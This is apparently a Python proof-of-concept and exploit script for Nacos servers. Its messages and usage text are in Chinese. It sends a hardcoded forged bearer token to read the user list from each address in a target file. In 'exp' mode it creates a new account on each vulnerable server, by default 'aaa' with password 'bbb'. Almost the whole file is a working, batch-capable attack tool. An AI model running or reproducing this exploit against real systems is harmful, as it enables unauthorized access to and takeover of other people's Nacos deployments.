import requests
import sys
import urllib3


def Poc(url):
    vul_url = 'nacos/v1/auth/users?pageNo=1&pageSize=100&&search=accurate'
    full_url = url + vul_url
    headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded",
                "Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTc0NDg1NjQ0Mn0.O2T66PwlNuuW_aNtwNAYO7-cc5fbHWXLPF9ZlTe0XQE",
    }
    try:
        res = requests.get(full_url, headers=headers, verify=False, timeout=5)
        if ("username" in res.text) and res.status_code == 200:
            print(f"\033[1;31m [+]POC: {url} 存在漏洞，可以读取账户pasword\033[0m")
        elif res.status_code == 404:
            print(f"\033[1;32m [*]POC: {url} 不确定存在漏洞，该网站默认系统账户password文件不存在\033[0m")
        else:
            print(f"\033[1;34m [ ]POC: {url} 不存在漏洞\033[0m")
    except Exception as e:
        # print(e)
        print(f"\033[1;34m [ ]POC: {url} 网站访问超时，请手动对网站进行测试\033[0m")
        sys.exit(0)


# def Poc_2(url):
#     vul_url = 'nacos/v1/ns/operator/cluster/states?withInstances=false&pageNo=1&pageSize=10&keyword=&accessToken=&namespaceId='
#     full_url = url + vul_url
#     headers = {
#                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
#                 "Content-Type": "application/x-www-form-urlencoded",
#                 "Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTc0NDg1NjQ0Mn0.O2T66PwlNuuW_aNtwNAYO7-cc5fbHWXLPF9ZlTe0XQE",
#     }
#     try:
#         res = requests.get(full_url, headers=headers, verify=False, timeout=10)
#         if res.status_code == 200:
#             print(res.text)
#             print(f"\033[1;31m [+]POC: {url} 存在漏洞，可以读取账户pasword\033[0m")
#         else:
#             print(f"\033[1;34m [ ]POC: {url} 不存在漏洞\033[0m")
#     except Exception as e:
#         print(f"\033[1;34m [ ]POC: {url} 不存在漏洞\033[0m")
#         sys.exit(0)


def Exp(url, username='aaa', password='bbb'):
    vul_url = f'nacos/v1/auth/users?username={username}&password={password}'
    full_url = url + vul_url
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY4MTY5ODA0Mn0.9mTsBWnTiKXQej4taCen6fwGB-72pC7Z9hvPYlNi-vQ",
    }
    try:
        res = requests.post(full_url, headers=headers, verify=False, timeout=5)
        if ("ok" in res.text) and res.status_code == 200:
            print(f"\033[1;31m [+]EXP: {url} 存在漏洞，创建账户成功,账户{username}，密码{password}\033[0m")
        elif (f"{username}" in res.text) and res.status_code == 400:
            print(f"\033[1;31m [+]EXP: {url} 存在漏洞，账户{username} 已存在\033[0m")
        else:
            print(f"\033[1;34m [ ]EXP: {url} 不存在漏洞\033[0m")
    except Exception as e:
        print(f"\033[1;34m [ ]EXP: {url} 存在{e}问题\033[0m\n")
        sys.exit(0)


if __name__ == '__main__':
    urllib3.disable_warnings()
    try:
        f = open(f"{sys.argv[2]}",mode="r")
        print(f"\033[1;31m 开始进入{sys.argv[1]}模式\n\033[0m")
        for i in f.readlines():
            i = i.replace('\n', '')
            # print(f"\033[1;31m 开始测试当前地址：{i} \n\033[0m",end='')
            if sys.argv[1] == 'poc':
                Poc(i)
            # elif sys.argv[1] == 'poc2':
            #     Poc_2(i)
            elif sys.argv[1] == 'exp':
                try:
                    if sys.argv[3] != None and sys.argv[4] != None:
                        Exp(i, sys.argv[3], sys.argv[4])
                except Exception as e:
                    Exp(i)
            else:
                print("\033[1;31m 漏洞扫描模式错误\033[0m")
            # print("------------------------------------------------------------------------------------")
    except Exception as e:
        print("""\033[1;34m
    使用说明：
            python unauth-nacos-key.py poc filename                     
            以poc模式对地址进行扫描
            
            python unauth-nacos-key.py exp filename username password    
            以exp模式对地址进行扫描(usernme,password可不写，默认创建账号aaa，密码bbb)
            
            文件中的地址格式如下： 
            http://192.168.1.1/
            http://192.168.1.2/
            http://192.168.1.3/
            \033[0m""")